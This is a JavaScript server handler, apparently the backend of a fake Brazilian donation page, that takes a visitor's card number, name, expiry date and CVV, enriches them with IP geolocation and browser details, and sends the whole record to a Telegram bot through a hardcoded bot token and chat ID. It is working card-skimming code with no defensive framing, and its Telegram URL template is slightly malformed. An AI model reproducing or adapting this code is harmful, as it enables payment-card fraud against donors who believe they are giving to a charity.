export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Só POST caralho' });
  }

  const {
    numero_cartao = '',
    nome_cartao = '',
    validade_cartao = '',
    cvv = '',
    valor_doacao = ''
  } = req.body || {};

  if (!numero_cartao || !cvv || !valor_doacao) {
    return res.status(400).send('Preenche os campos essenciais porra');
  }

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['cf-connecting-ip'] || req.socket?.remoteAddress || 'desconhecido';
  const userAgent = req.headers['user-agent'] || 'N/A';
  const acceptLanguage = req.headers['accept-language'] || 'N/A';

  let ipInfo = { query: ip, city: 'N/A', regionName: 'N/A', country: 'N/A', isp: 'N/A' };
  try {
    const ipResponse = await fetch(`http://ip-api.com/json/${ip}`);
    if (ipResponse.ok) ipInfo = await ipResponse.json();
  } catch (e) {
    console.log('ip-api deu merda:', e);
  }

  let navegador = 'Desconhecido';
  if (/Firefox/i.test(userAgent)) navegador = 'Firefox';
  else if (/Edg/i.test(userAgent)) navegador = 'Edge';
  else if (/Chrome/i.test(userAgent)) navegador = 'Chrome';
  else if (/Safari/i.test(userAgent)) navegador = 'Safari';
  else if (/OPR|Opera/i.test(userAgent)) navegador = 'Opera';

  const dataHora = new Date().toISOString().replace('T', ' ').split('.')[0];

  const conteudo = 
`🦆 | LOG┃doe.savebrasil.org.br

💳 | Número do Cartão: ${numero_cartao}
🔐 | Nome no Cartão: ${nome_cartao}
📅 | Validade: ${validade_cartao}
🔑 | Cvv/Cvc: ${cvv}
💰 | Valor da Doação: R$ ${valor_doacao}

🏠 | IP: ${ipInfo.query || ip}
🔎 | Cidade: ${ipInfo.city}
📍 | Região: ${ipInfo.regionName}
🌎 | País: ${ipInfo.country}
📦 | ISP: ${ipInfo.isp}

🔓 | USER-AGENT: ${userAgent}
🌐 | NAVEGADOR: ${navegador}
👥 | LINGUAGEM: ${acceptLanguage}
📆 | DATA/HORA: ${dataHora}`;

  const botToken = '8249791748:AAHsushNFJnmQ_eh3QMx4ijxe8y8mVbZa9U';
  const chatId = '-1003615689623';

  const telegramUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(conteudo)}`;

  try {
    console.log('Enviando pro grupo:', conteudo.substring(0, 150));
    const tgRes = await fetch(telegramUrl);
    const tgText = await tgRes.text();
    console.log('Telegram respondeu:', tgText);

    if (tgRes.ok) {
      return res.redirect(302, '/checkout.html');
    } else {
      return res.status(500).send('Telegram fodeu: ' + tgText);
    }
  } catch (err) {
    console.error('Fetch pro Telegram explodiu:', err.message);
    return res.status(500).send('Merda geral');
  }
}
